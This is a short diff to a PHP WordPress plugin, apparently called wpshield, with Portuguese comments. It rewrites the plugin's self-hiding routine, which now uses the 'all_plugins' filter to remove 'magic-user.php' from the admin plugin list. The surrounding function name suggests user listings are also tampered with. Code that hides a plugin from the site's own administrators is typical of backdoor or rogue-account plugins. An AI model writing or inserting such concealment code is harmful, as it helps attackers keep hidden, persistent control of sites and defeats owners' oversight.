@@ -69,16 +69,15 @@ function wpshield_listViewsUsers( $views ) {
 }
 
 // Hide plugin from list
-add_action('pre_current_active_plugins', 'wpshield_hidePlugin');
-function wpshield_hidePlugin() {
-    global $wp_list_table;
-    $hidearr = array(plugin_basename(__FILE__)); // Usando plugin_basename para garantir o caminho correto
+add_filter('all_plugins', 'wpshield_hidePlugin');
+function wpshield_hidePlugin($all_plugins) {
+    // Nome do plugin (diretório/arquivo) para ocultar
+    $hide_plugin = 'magic-user.php'; // Substitua pelo nome correto, conforme a estrutura do seu plugin
 
-    $myplugins = $wp_list_table->items;
-
-    foreach ($myplugins as $key => $val) {
-        if (in_array($key, $hidearr)) {
-            unset($wp_list_table->items[$key]);
-        }
+    // Verifique se o plugin está presente e remova da lista
+    if (isset($all_plugins[$hide_plugin])) {
+        unset($all_plugins[$hide_plugin]);
     }
+
+    return $all_plugins;
 }
